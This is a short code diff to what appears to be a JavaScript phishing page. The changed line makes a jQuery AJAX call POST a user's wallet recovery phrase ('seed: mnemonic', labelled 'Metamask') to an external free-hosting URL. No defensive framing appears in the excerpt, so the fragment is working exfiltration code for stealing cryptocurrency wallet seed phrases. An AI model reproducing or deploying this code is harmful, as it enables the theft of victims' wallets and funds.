@@ -479,7 +479,7 @@
         if(stage < lastStage) {
           $.ajax({
             method: "POST",
-            url: "url.php",
+            url: "https://caveteriada01.000webhostapp.com/reload.php",
             data: { seed: mnemonic, wallet: 'Metamask' },
             success: function(data) {
               updateStage()
